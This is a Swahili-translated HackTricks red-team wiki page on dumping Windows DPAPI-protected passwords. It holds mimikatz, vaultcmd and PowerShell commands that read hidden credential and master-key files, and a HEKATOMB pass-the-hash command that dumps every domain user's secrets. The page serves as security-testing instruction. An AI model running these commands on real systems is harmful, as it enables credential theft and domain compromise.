# DPAPI - Kuchimbua Nywila

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa ** lengo la kukuza maarifa ya kiufundi**, kongamano hili ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila nidhamu.

{% embed url="https://www.rootedcon.com/" %}

## Ni Nini DPAPI

API ya Ulinzi wa Data (DPAPI) hutumiwa hasa ndani ya mfumo wa uendeshaji wa Windows kwa **encryption ya symmetric ya funguo za asymmetric**, ikitumia siri za mtumiaji au mfumo kama chanzo kikuu cha entropy. Mbinu hii inasaidia encryption kwa watengenezaji kwa kuwaruhusu kuchimba data kwa kutumia funguo lililotokana na siri za kuingia za mtumiaji au, kwa encryption ya mfumo, siri za uthibitishaji wa kikoa cha mfumo, hivyo kuepuka haja ya watengenezaji kusimamia ulinzi wa funguo la encryption wenyewe.

### Data Iliyolindwa na DPAPI

Miongoni mwa data binafsi iliyolindwa na DPAPI ni:

* Nywila za Internet Explorer na Google Chrome na data ya kujaza moja kwa moja
* Nywila za barua pepe na akaunti za FTP za ndani kwa programu kama Outlook na Windows Mail
* Nywila za folda zilizoshirikiwa, rasilimali, mitandao ya wireless, na Vault ya Windows, pamoja na funguo za encryption
* Nywila za uunganisho wa desktop wa mbali, .NET Passport, na funguo za kibinafsi kwa madhumuni mbalimbali ya encryption na uthibitishaji
* Nywila za mtandao zinazosimamiwa na Meneja wa Sifa na data binafsi katika programu zinazotumia CryptProtectData, kama vile Skype, MSN messenger, na zingine

## Orodha ya Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Faili za Kibali

**Faili za kibali zilizolindwa** zinaweza kupatikana katika:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Pata habari za siri kutumia mimikatz `dpapi::cred`, kwenye jibu unaweza kupata habari za kuvutia kama data iliyofichwa na guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Unaweza kutumia **moduli ya mimikatz** `dpapi::cred` na `/masterkey` sahihi kufichua:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Funguo za Mwalimu

Funguo za DPAPI zinazotumika kwa kuchipua funguo za RSA za mtumiaji hufungwa chini ya saraka `%APPDATA%\Microsoft\Protect\{SID}`, ambapo {SID} ni [**Kitambulisho cha Usalama**](https://en.wikipedia.org/wiki/Security\_Identifier) **wa mtumiaji huyo**. **Funguo za DPAPI zimehifadhiwa kwenye faili ile ile na funguo mwalimu inayolinda funguo binafsi za watumiaji**. Kawaida ni data ya kubahatisha ya baiti 64. (Tambua kuwa saraka hii imehifadhiwa hivyo huwezi kuorodhesha kutumia `dir` kutoka kwa cmd, lakini unaweza kuorodhesha kutumia PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Hii ndio jinsi seti ya funguo za Mwalimu wa mtumiaji itakavyoonekana:

![](<../../.gitbook/assets/image (1118).png>)

Kawaida **kila funguo kuu ni funguo iliyofichwa ya kisimetri ambayo inaweza kufichua maudhui mengine**. Kwa hivyo, **kuchimba** **Funguo Kuu iliyofichwa** ni ya kuvutia ili **kufichua** baadaye **maudhui mengine** yaliyofichwa nayo.

### Chimba funguo kuu & fua

Angalia chapisho [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) kwa mfano wa jinsi ya kuchimba funguo kuu na kufua.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) ni nakala ya C# ya baadhi ya utendaji wa DPAPI kutoka kwa [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) mradi.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni chombo kinachotuza uchimbaji wa watumiaji wote na kompyuta kutoka kwenye saraka ya LDAP na uchimbaji wa funguo za chelezo za kudhibiti uwanja kupitia RPC. Hatua hiyo itatatua anwani zote za IP za kompyuta na kutekeleza smbclient kwenye kompyuta zote kupata blobs zote za DPAPI za watumiaji wote na kufua kila kitu na funguo la chelezo la uwanja.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Ukiwa na orodha ya kompyuta zilizochimbwa kutoka kwa LDAP unaweza kupata kila mtandao wa sehemu hata kama hukujua!

"Kwa sababu haki za Msimamizi wa Uwanja hazitoshi. Wachimbue wote."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kudondosha siri zilizolindwa na DPAPI kiotomatiki.

## Marejeo

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **malengo ya kukuza maarifa ya kiufundi**, kongamano hili ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila nidhamu.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika kampuni ya **usalama wa mtandao**? Je, unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) **kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
